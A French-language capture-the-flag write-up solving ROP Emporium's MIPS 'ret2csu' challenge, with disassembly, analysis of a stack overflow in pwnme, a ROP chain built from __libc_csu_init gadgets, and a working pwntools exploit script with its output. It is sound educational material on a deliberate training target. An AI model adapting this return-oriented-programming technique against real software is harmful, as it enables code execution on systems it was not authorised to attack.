---
Title: Ropemporium mipsel ret2csu
Date: 2023-07-08
Tags: [linux, python, ROP, mipsel, ropemporium, write-up]
Categories: [tutorial]
Author: cdpointpoint
Draft: False
---

# mipsel ret2csu

## Introduction

Dans cet exercice, on doit appeller ret2win avec les paramètres convenus mais on dispose de peu de gadgets.

L'énoncé ropemporium : [ret2csu](https://ropemporium.com/challenge/ret2csu.html)

## Découverte

### Le contenu du challenge

    -rw-r--r--  1 jce jce    32  5 juil.  2020 encrypted_flag.dat
    -rw-r--r--  1 jce jce    32  5 juil.  2020 key.dat
    -rwxr-xr-x  1 jce jce 11724  6 juil.  2020 libret2csu_mipsel.so
    -rwxr-xr-x  1 jce jce  7884  6 juil.  2020 ret2csu_mipsel


### Première execution

    # ./ret2csu_mipsel 
    ret2csu by ROP Emporium
    MIPS

    Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.

    > AAAAAAAAAAABBBBBBBBBBCCCCCCCCCCC
    Thank you!
    Bus error (core dumped)


## Analyse

### Le programme principal

La fonction mains appelle la fonction pwnme sui se trouve dans la librairie.

    [0x004006f0]> pdf @ sym.main
    ┌ 76: int main (int32_t argc);
    │           ; arg int32_t argc @ fp+0x10
    │           ; var int32_t var_10h @ sp+0x10
    │           ; var int32_t var_18h @ sp+0x18
    │           ; var int32_t var_1ch @ sp+0x1c
    │           0x00400890      e0ffbd27       addiu sp, sp, -0x20
    │           0x00400894      1c00bfaf       sw ra, (var_1ch)
    │           0x00400898      1800beaf       sw fp, (var_18h)
    │           0x0040089c      25f0a003       move fp, sp
    │           0x004008a0      42001c3c       lui gp, 0x42                ; 'B'
    │           0x004008a4      10909c27       addiu gp, gp, -0x6ff0
    │           0x004008a8      1000bcaf       sw gp, (var_10h)
    │           0x004008ac      5080828f       lw v0, -sym._MIPS_STUBS_(gp) ; [0x411060:4]=0x400a50 sym.imp.pwnme
    │           0x004008b0      25c84000       move t9, v0
    │           0x004008b4      09f82003       jalr t9
    │           0x004008b8      00000000       nop
    │           0x004008bc      1000dc8f       lw gp, (var_10h)
    │           0x004008c0      25100000       move v0, zero
    │           0x004008c4      25e8c003       move sp, fp
    │           0x004008c8      1c00bf8f       lw ra, (var_1ch)
    │           0x004008cc      1800be8f       lw fp, (var_18h)
    │           0x004008d0      2000bd27       addiu sp, sp, 0x20
    │           0x004008d4      0800e003       jr ra
    └           0x004008d8      00000000       nop

On retrouve aussi une fonction `usefulFunction` appelle la fonction `ret2win` importée elle aussi de la libririe dynamique.

    [0x004006f0]> pdf @ sym.usefulFunction 
    ┌ 88: sym.usefulFunction (int32_t arg1, int32_t arg2, int32_t arg3, int32_t arg_10h);
    │           ; arg int32_t arg_10h @ fp+0x10
    │           ; var int32_t var_10h @ sp+0x10
    │           ; var int32_t var_18h @ sp+0x18
    │           ; var int32_t var_1ch @ sp+0x1c
    │           ; arg int32_t arg1 @ a0
    │           ; arg int32_t arg2 @ a1
    │           ; arg int32_t arg3 @ a2
    │           0x004008dc      e0ffbd27       addiu sp, sp, -0x20
    │           0x004008e0      1c00bfaf       sw ra, (var_1ch)
    │           0x004008e4      1800beaf       sw fp, (var_18h)
    │           0x004008e8      25f0a003       move fp, sp
    │           0x004008ec      42001c3c       lui gp, 0x42                ; 'B'
    │           0x004008f0      10909c27       addiu gp, gp, -0x6ff0
    │           0x004008f4      1000bcaf       sw gp, (var_10h)
    │           0x004008f8      03000624       addiu a2, zero, 3           ; arg3
    │           0x004008fc      02000524       addiu a1, zero, 2           ; arg2
    │           0x00400900      01000424       addiu a0, zero, 1           ; arg1
    │           0x00400904      4880828f       lw v0, -sym.imp.ret2win(gp) ; [0x411058:4]=0x400a60 sym.imp.ret2win
    │           0x00400908      25c84000       move t9, v0
    │           0x0040090c      09f82003       jalr t9
    │           0x00400910      00000000       nop
    │           0x00400914      1000dc8f       lw gp, (var_10h)
    │           0x00400918      00000000       nop
    │           0x0040091c      25e8c003       move sp, fp
    │           0x00400920      1c00bf8f       lw ra, (var_1ch)
    │           0x00400924      1800be8f       lw fp, (var_18h)
    │           0x00400928      2000bd27       addiu sp, sp, 0x20
    │           0x0040092c      0800e003       jr ra
    └           0x00400930      00000000       nop

Cette fonction nous permet de voir que ret2win attend 3 paramètres.
En outre les tables PLT et GOT possèdent de ce fait une entrée `ret2win`.

Notre exploitation doit donc consister à appeller ret2win avec les paramètres convenus.


La fonction __libc_csu_init

    [0x00400904]> pdf @ sym.__libc_csu_init 

    ┌ 164: sym.__libc_csu_init ();
    │           ; var int32_t var_10h @ sp+0x10
    │           ; var int32_t var_1ch @ sp+0x1c
    │           ; var int32_t var_20h @ sp+0x20
    │           ; var int32_t var_24h @ sp+0x24
    │           ; var int32_t var_28h @ sp+0x28
    │           ; var int32_t var_2ch @ sp+0x2c
    │           ; var int32_t var_30h @ sp+0x30
    │           ; var int32_t var_34h @ sp+0x34
    │           0x00400940      02001c3c       lui gp, 2
    │           0x00400944      d0869c27       addiu gp, gp, -0x7930
    │           0x00400948      21e09903       addu gp, gp, t9
    │           0x0040094c      c8ffbd27       addiu sp, sp, -0x38
    │           0x00400950      2880998f       lw t9, -sym._init(gp)       ; [0x411038:4]=0x400670 sym..init
    │           0x00400954      1000bcaf       sw gp, (var_10h)
    │           0x00400958      3000b5af       sw s5, (var_30h)
    │           0x0040095c      25a8c000       move s5, a2
    │           0x00400960      2c00b4af       sw s4, (var_2ch)
    │           0x00400964      25a0a000       move s4, a1
    │           0x00400968      2800b3af       sw s3, (var_28h)
    │           0x0040096c      25988000       move s3, a0
    │           0x00400970      2400b2af       sw s2, (var_24h)
    │           0x00400974      1c00b0af       sw s0, (var_1ch)
    │           0x00400978      3400bfaf       sw ra, (var_34h)
    │           0x0040097c      3cff1104       bal sym._init
    │           0x00400980      2000b1af       sw s1, (var_20h)
    │           0x00400984      1000bc8f       lw gp, (var_10h)
    │           0x00400988      2c80908f       lw s0, -obj.__CTOR_LIST__(gp) ; [0x41103c:4]=0x410ff0 loc.__init_array_start
    │           0x0040098c      2c80928f       lw s2, -obj.__CTOR_LIST__(gp) ; [0x41103c:4]=0x410ff0 loc.__init_array_start
    │           0x00400990      23905002       subu s2, s2, s0
    │           0x00400994      83901200       sra s2, s2, 2
    │       ┌─< 0x00400998      09004012       beqz s2, 0x4009c0
    │       │   0x0040099c      25880000       move s1, zero
    │       │   ; CODE XREF from sym.__libc_csu_init @ 0x4009b8
    │      ┌──> 0x004009a0      0000198e       lw t9, (s0)                 ; [0x410ff0:4]=-1
    │      ╎│   0x004009a4      01003126       addiu s1, s1, 1
    │      ╎│   0x004009a8      2530a002       move a2, s5
    │      ╎│   0x004009ac      25288002       move a1, s4
    │      ╎│   0x004009b0      09f82003       jalr t9
    │      ╎│   0x004009b4      25206002       move a0, s3
    │      └──< 0x004009b8      f9ff5116       bne s2, s1, 0x4009a0
    │       │   0x004009bc      04001026       addiu s0, s0, 4
    │       │   ; CODE XREF from sym.__libc_csu_init @ 0x400998
    │       └─> 0x004009c0      3400bf8f       lw ra, (var_34h)
    │           0x004009c4      3000b58f       lw s5, (var_30h)
    │           0x004009c8      2c00b48f       lw s4, (var_2ch)
    │           0x004009cc      2800b38f       lw s3, (var_28h)
    │           0x004009d0      2400b28f       lw s2, (var_24h)
    │           0x004009d4      2000b18f       lw s1, (var_20h)
    │           0x004009d8      1c00b08f       lw s0, (var_1ch)
    │           0x004009dc      0800e003       jr ra
    └           0x004009e0      3800bd27       addiu sp, sp, 0x38


## La librairie libret2csu_mipsel.so

Le code de la fonction ret2win est assez conséquent.
On va juste focaliser sur le début et la vérification des paramètres :

    0x00000710]> pdf @ sym.ret2win
    ┌ 1188: sym.ret2win (int32_t arg1, int32_t arg2, int32_t arg_10h, int32_t arg_18h, int32_t arg_1ch, int32_t arg_28h, int32_t arg_2ch, int32_t arg_30h);
    │           ; arg int32_t arg_10h @ fp+0x10
    │           ; arg int32_t arg_18h @ fp+0x18
    │           ; arg int32_t arg_1ch @ fp+0x1c
    │           ; arg int32_t arg_28h @ fp+0x28
    │           ; arg int32_t arg_2ch @ fp+0x2c
    │           ; arg int32_t arg_30h @ fp+0x30
    │           ; var int32_t var_10h @ sp+0x38
    │           ; var int32_t var_18h @ sp+0x40
    │           ; var int32_t var_1ch @ sp+0x44
    │           ; var int32_t var_20h @ sp+0x48
    │           ; var int32_t var_24h @ sp+0x4c
    │           ; arg int32_t arg1 @ a0
    │           ; arg int32_t arg2 @ a1
    │           0x000009cc      02001c3c       lui gp, 2
    │           0x000009d0      24969c27       addiu gp, gp, -0x69dc
    │           0x000009d4      21e09903       addu gp, gp, t9
    │           0x000009d8      d8ffbd27       addiu sp, sp, -0x28
    │           0x000009dc      2400bfaf       sw ra, (var_24h)
    │           0x000009e0      2000beaf       sw fp, (var_20h)
    │           0x000009e4      25f0a003       move fp, sp
    │           0x000009e8      1000bcaf       sw gp, (var_10h)
    │           0x000009ec      2800c4af       sw a0, (arg_28h)
    │           0x000009f0      2c00c5af       sw a1, (arg_2ch)
    │           0x000009f4      3000c6af       sw a2, (arg_30h)
    │           0x000009f8      1c00c0af       sw zero, (var_1ch)
    │           0x000009fc      2800c38f       lw v1, (arg_28h)            ; [0x178000:4]=0
    │                                                                      ; fp
    │           0x00000a00      adde023c       lui v0, 0xdead
    │           0x00000a04      efbe4234       ori v0, v0, 0xbeef
    │       ┌─< 0x00000a08      58006214       bne v1, v0, 0xb6c
    │       │   0x00000a0c      00000000       nop
    │       │   0x00000a10      2c00c38f       lw v1, (arg_2ch)
    │       │   0x00000a14      feca023c       lui v0, 0xcafe
    │       │   0x00000a18      beba4234       ori v0, v0, 0xbabe
    │      ┌──< 0x00000a1c      53006214       bne v1, v0, 0xb6c
    │      ││   0x00000a20      00000000       nop
    │      ││   0x00000a24      3000c38f       lw v1, (arg_30h)
    │      ││   0x00000a28      0dd0023c       lui v0, 0xd00d
    │      ││   0x00000a2c      0df04234       ori v0, v0, 0xf00d
    │     ┌───< 0x00000a30      4e006214       bne v1, v0, 0xb6c
        
On voit que les paramètres contenus dans les registres a0, a1 et a2 sont stockés dans des variables locales (fp+28, fp+2c, fp+30) puis comparés aux valeurs 0xdeadbeef, cafebabe, f00df00d.

La fonction vulnérable

    ┌ 316: sym.pwnme (int32_t arg1, int32_t arg3, int32_t arg_10h, int32_t arg_18h);
    │           ; arg int32_t arg_10h @ fp+0x10
    │           ; arg int32_t arg_18h @ fp+0x18
    │           ; var int32_t var_10h @ sp+0x10
    │           ; var int32_t var_18h @ sp+0x18
    │           ; var int32_t var_38h @ sp+0x38
    │           ; var int32_t var_3ch @ sp+0x3c
    │           ; arg int32_t arg1 @ a0
    │           ; arg int32_t arg3 @ a2
    │           0x00000890      02001c3c       lui gp, 2
    │           0x00000894      60979c27       addiu gp, gp, -0x68a0
    │           0x00000898      21e09903       addu gp, gp, t9
    │           0x0000089c      c0ffbd27       addiu sp, sp, -0x40
    │           0x000008a0      3c00bfaf       sw ra, (var_3ch)
    │           0x000008a4      3800beaf       sw fp, (var_38h)
    │           0x000008a8      25f0a003       move fp, sp
    │           0x000008ac      1000bcaf       sw gp, (var_10h)
    │           0x000008b0      4080828f       lw v0, -0x7fc0(gp)          ; [0x12030:4]=0
    │           0x000008b4      0000428c       lw v0, (v0)
    │           0x000008b8      25380000       move a3, zero
    │           0x000008bc      02000624       addiu a2, zero, 2           ; arg3
    │           0x000008c0      25280000       move a1, zero
    │           0x000008c4      25204000       move a0, v0
    │           0x000008c8      4c80828f       lw v0, -sym.imp.setvbuf(gp) ; [0x1203c:4]=0xf40 sym.imp.setvbuf
    │           0x000008cc      25c84000       move t9, v0
    │           0x000008d0      09f82003       jalr t9
    │           0x000008d4      00000000       nop
    │           0x000008d8      1000dc8f       lw gp, (var_10h)
    │           0x000008dc      2880828f       lw v0, -0x7fd8(gp)          ; [0x12018:4]=0
    │           0x000008e0      e00f4424       addiu a0, v0, str.ret2csu_by_ROP_Emporium ; 0xfe0 ; "ret2csu by ROP Emporium" ; arg1
    │           0x000008e4      5880828f       lw v0, -sym.imp.puts(gp)    ; [0x12048:4]=0xf20 sym.imp.puts
    │           0x000008e8      25c84000       move t9, v0
    │           0x000008ec      09f82003       jalr t9
    │           0x000008f0      00000000       nop
    │           0x000008f4      1000dc8f       lw gp, (var_10h)
    │           0x000008f8      2880828f       lw v0, -0x7fd8(gp)          ; [0x12018:4]=0
    │           0x000008fc      f80f4424       addiu a0, v0, str.MIPS_n    ; 0xff8 ; "MIPS\n" ; arg1
    │           0x00000900      5880828f       lw v0, -sym.imp.puts(gp)    ; [0x12048:4]=0xf20 sym.imp.puts
    │           0x00000904      25c84000       move t9, v0
    │           0x00000908      09f82003       jalr t9
    │           0x0000090c      00000000       nop
    │           0x00000910      1000dc8f       lw gp, (var_10h)
    │           0x00000914      20000624       addiu a2, zero, 0x20        ; arg3
    │           0x00000918      25280000       move a1, zero
    │           0x0000091c      1800c227       addiu v0, fp, 0x18
    │           0x00000920      25204000       move a0, v0
    │           0x00000924      4880828f       lw v0, -sym.imp.memset(gp)  ; [0x12038:4]=0xf50 sym.imp.memset
    │           0x00000928      25c84000       move t9, v0
    │           0x0000092c      09f82003       jalr t9
    │           0x00000930      00000000       nop
    │           0x00000934      1000dc8f       lw gp, (var_10h)
    │           0x00000938      2880828f       lw v0, -0x7fd8(gp)          ; [0x12018:4]=0
    ; "Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.\n" ; 
    │           0x0000093c      00104424       addiu a0, v0, str.Check_out_https:
    │           0x00000940      5880828f       lw v0, -sym.imp.puts(gp)    ; [0x12048:4]=0xf20 sym.imp.puts
    │           0x00000944      25c84000       move t9, v0
    │           0x00000948      09f82003       jalr t9
    │           0x0000094c      00000000       nop
    │           0x00000950      1000dc8f       lw gp, (var_10h)
    │           0x00000954      2880828f       lw v0, -0x7fd8(gp)          ; [0x12018:4]=0
    │           0x00000958      6c104424       addiu a0, v0, 0x106c        ; arg1
    │           0x0000095c      6880828f       lw v0, -sym.imp.printf(gp)  ; [0x12058:4]=0xee0 sym.imp.printf
    │           0x00000960      25c84000       move t9, v0
    │           0x00000964      09f82003       jalr t9
    │           0x00000968      00000000       nop
    │           0x0000096c      1000dc8f       lw gp, (var_10h)
    │           0x00000970      00020624       addiu a2, zero, 0x200       ; arg3
    │           0x00000974      1800c227       addiu v0, fp, 0x18
    │           0x00000978      25284000       move a1, v0
    │           0x0000097c      25200000       move a0, zero
    │           0x00000980      7080828f       lw v0, -sym._MIPS_STUBS_(gp) ; [0x12060:4]=0xed0 sym.imp.read
    │           0x00000984      25c84000       move t9, v0
    │           0x00000988      09f82003       jalr t9
    │           0x0000098c      00000000       nop
    │           0x00000990      1000dc8f       lw gp, (var_10h)
    │           0x00000994      2880828f       lw v0, -0x7fd8(gp)          ; [0x12018:4]=0
    │           0x00000998      70104424       addiu a0, v0, str.Thank_you_ ; 0x1070 ; "Thank you!" ; arg1
    │           0x0000099c      5880828f       lw v0, -sym.imp.puts(gp)    ; [0x12048:4]=0xf20 sym.imp.puts
    │           0x000009a0      25c84000       move t9, v0
    │           0x000009a4      09f82003       jalr t9
    │           0x000009a8      00000000       nop
    │           0x000009ac      1000dc8f       lw gp, (var_10h)
    │           0x000009b0      00000000       nop
    │           0x000009b4      25e8c003       move sp, fp
    │           0x000009b8      3c00bf8f       lw ra, (var_3ch)
    │           0x000009bc      3800be8f       lw fp, (var_38h)
    │           0x000009c0      4000bd27       addiu sp, sp, 0x40
    │           0x000009c4      0800e003       jr ra
    └           0x000009c8      00000000       nop

On s'intéresse à l'lecture sur stdin.

    │           0x00000970      00020624       addiu a2, zero, 0x200       ; arg3
    │           0x00000974      1800c227       addiu v0, fp, 0x18
    │           0x00000978      25284000       move a1, v0
    │           0x0000097c      25200000       move a0, zero
    │           0x00000980      7080828f       lw v0, -sym._MIPS_STUBS_(gp) ; [0x12060:4]=0xed0 sym.imp.read
    │           0x00000984      25c84000       move t9, v0
    │           0x00000988      09f82003       jalr t9
    │           0x0000098c      00000000       nop

    La taille lue est de 512 octets dans la variable fp+0x18 on a donc un débordement après 0x20 octets.



    ## Construction de l'exploitation

    ### Recherche de gadgets.

    Pour appeler ret2win avec les 3 paramètres attendus il nous faut charger les registres a0,a1 et a2.

    libc_csu_init contient ce gadget :


    │      ┌──> 0x004009a0      0000198e       lw t9, (s0)                 ; [0x410ff0:4]=-1
    │      ╎│   0x004009a4      01003126       addiu s1, s1, 1
    │      ╎│   0x004009a8      2530a002       move a2, s5
    │      ╎│   0x004009ac      25288002       move a1, s4
    │      ╎│   0x004009b0      09f82003       jalr t9
    │      ╎│   0x004009b4      25206002       move a0, s3
    │      └──< 0x004009b8      f9ff5116       bne s2, s1, 0x4009a0
    │       │   0x004009bc      04001026       addiu s0, s0, 4
    │       └─> 0x004009c0      3400bf8f       lw ra, (var_34h)
    │           0x004009c4      3000b58f       lw s5, (var_30h)
    │           0x004009c8      2c00b48f       lw s4, (var_2ch)
    │           0x004009cc      2800b38f       lw s3, (var_28h)
    │           0x004009d0      2400b28f       lw s2, (var_24h)
    │           0x004009d4      2000b18f       lw s1, (var_20h)
    │           0x004009d8      1c00b08f       lw s0, (var_1ch)
    │           0x004009dc      0800e003       jr ra
    └           0x004009e0      3800bd27       addiu sp, sp, 0x38


Ce qui nous intéresse d'abord c'est :

    │      ╎│   0x004009a8      2530a002       move a2, s5
    │      ╎│   0x004009ac      25288002       move a1, s4
    │      ╎│   0x004009b0      09f82003       jalr t9
    │      ╎│   0x004009b4      25206002       move a0, s3

Pour valoriser s3,s4 et s5 on a la seconde partie :

        0x004009c0      3400bf8f       lw ra, (var_34h)
        0x004009c4      3000b58f       lw s5, (var_30h)
        0x004009c8      2c00b48f       lw s4, (var_2ch)
        0x004009cc      2800b38f       lw s3, (var_28h)
        0x004009d0      2400b28f       lw s2, (var_24h)
        0x004009d4      2000b18f       lw s1, (var_20h)
        0x004009d8      1c00b08f       lw s0, (var_1ch)
        0x004009dc      0800e003       jr ra
        0x004009e0      3800bd27       addiu sp, sp, 0x38

L'instruction "0x004009b0 jalr t9" doit être inhibée en placant dans t9 une adresse  de gadget neutre.
Pour charger t9 on a l'instruction avant le move a2,s5 :

        0x004009a0      0000198e       lw t9, (s0) 
        0x004009a8      2530a002       move a2, s5
        0x004009ac      25288002       move a1, s4
        0x004009b0      09f82003       jalr t9
        0x004009b4      25206002       move a0, s3


Comme dans la version x64 du challenge on doit trouver une adresse à charger dans s0 qui contiennt une gadget neutre.


On a en particulier cette référence :

    ┌ 8: sym.__libc_csu_fini ();
    │           0x004009e4      0800e003       jr ra
    └           0x004009e8      00000000       nop
                0x004009ec      00000000       nop

Cette fonction réservée qui implicitement ne fait rien est référencées dans la section .dynsym

    [0x004003c0]> pxw 48 @sym..dynsym
    0x004003cc  0x00000000 0x00000000 0x00000000 0x00000000  ................
    0x004003dc  0x000000bf 0x004009e4 0x00000008 0x000d0012  ......@.........
                           ici
    0x004003ec  0x0000001c 0x00000001 0x00000000 0xfff10013  ................

La commande d'analyse des reférences nous précise :

    [0x004003c0]> axt 0x004009e4
    (nofunc) 0x4003e0 [UNKNOWN] invalid

On retient donc .dynsym+0x14 comme addresse à charger dans s0.

### La chaine de rop

| ROP entry | gadget | comment |
| ----------- | ------- | ----- |
| 0x004009c0 | gadget2 | charge les registres
| 0xdeadbeef | junk | Pour atteindre sp+0x1c
| 0xdeadbeef | junk |  
| 0xdeadbeef | junk |  
| 0xdeadbeef | junk |  
| 0xdeadbeef | junk |  
| 0xdeadbeef | junk |  
| 0xdeadbeef | junk |  
| 0x4003e0 | .synsym+20 | pour s0 puis t9
| 1 | 1 | pour s1 
| 2 | 2 | pour s2 en vue de s2==s1+1
| 0xdeadbeef | 0xdeadbeef | pour s3 puis a0
| 0xcafebabe | 0xcafebabe | pour s4 puis a1
| 0xcafebabe | 0xcafebabe | pour s5 puis a2
| 0x004009a0 | gadget1  | Affactation de a0,a1,a2 et call
| -----------| parametres de gadget1| |
| 0xdeadbeef | junk |   
| ... | ... | 12 fois |
| 0x00400a5c | ret2win | Appel final   


## Exploitation

### Script python

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# Set up pwntools for the correct architecture
elf = context.binary = ELF('ret2csu_mipsel')
context.terminal=["/usr/bin/xterm", "-fa", "Monospace", "-fs","12", "-e"]

gs='''
b *pwnme+308
c
'''

# Gadgets
# Gadget1  
'''
 0x004009a0   lw t9, (s0) 
 0x004009a4   addiu s1, s1, 1
 0x004009a8   move a2, s5
 0x004009ac   move a1, s4
 0x004009b0   jalr t9
 0x004009b4   move a0, s3
 0x004009b8   bne s2, s1, 0x4009a0
 0x004009bc   addiu s0, s0, 4
 0x004009c0   lw ra, (var_34h)
 0x004009c4   lw s5, (var_30h)
 0x004009c8   lw s4, (var_2ch)
 0x004009cc   lw s3, (var_28h)
 0x004009d0   lw s2, (var_24h)
 0x004009d4   lw s1, (var_20h)
 0x004009d8   lw s0, (var_1ch)
 0x004009dc   jr ra
 0x004009e0   addiu sp, sp, 0x38
'''
gadget1 = 0x004009a0

'''
 Gadget2  
 0x004009c0   lw ra, (var_34h)
 0x004009c4   lw s5, (var_30h)
 0x004009c8   lw s4, (var_2ch)
 0x004009cc   lw s3, (var_28h)
 0x004009d0   lw s2, (var_24h)
 0x004009d4   lw s1, (var_20h)
 0x004009d8   lw s0, (var_1ch)
 0x004009dc   jr ra
 0x004009e0   addiu sp, sp, 0x38
'''
gadget2 = 0x004009c0

if len(sys.argv)>1 and sys.argv[1] == "-d":
    io = gdb.debug([elf.path],gdbscript=gs)
else:
    io = process([elf.path])


# Section .dynamic
dynamic_s = elf.get_section_by_name('.dynsym').header['sh_addr']
ret2win = elf.plt["ret2win"]

log.info(f"{ret2win=:x}")
log.info(f"{dynamic_s=:x}")

offset=0x24

PL=b"A"*offset
PL+=p32(gadget2)             # ra    
for _ in range(7):
	PL+=p32(0xdeadbeef)        
PL+=p32(dynamic_s+0x14)    # s0
PL+=p32(1)  			   # s1
PL+=p32(2)  			   # s2 prepare s1+1=s2
PL+=p32(0xdeadbeef)        # s3 => a0 ensuite
PL+=p32(0xcafebabe)        # s4 => a1 ensuite
PL+=p32(0xd00df00d)        # s5 => a3 ensuite
PL+=p32(gadget1)             # ra    

for _ in range(13):
	PL+=p32(0xdeadbeef)        
PL+=p32(ret2win)             # ra    

io.sendlineafter(b"> ", PL)


io.recvuntil(b"ROPE")
flag=io.recvline().decode()
log.success(f"flag : ROPE{flag}")
io.close()

```

### Execution

    [*] '/w/ropemporium/mipsel/08_ret2csu/ret2csu_mipsel'
        Arch:     mips-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
        RUNPATH:  b'.'
    [+] Starting local process '/w/ropemporium/mipsel/08_ret2csu/ret2csu_mipsel': pid 788
    [*] ret2win=400a5c
    [*] dynamic_s=4003cc
    [+] flag : ROPE{a_placeholder_32byte_flag!}
    [*] Stopped process '/w/ropemporium/mipsel/08_ret2csu/ret2csu_mipsel' (pid 788
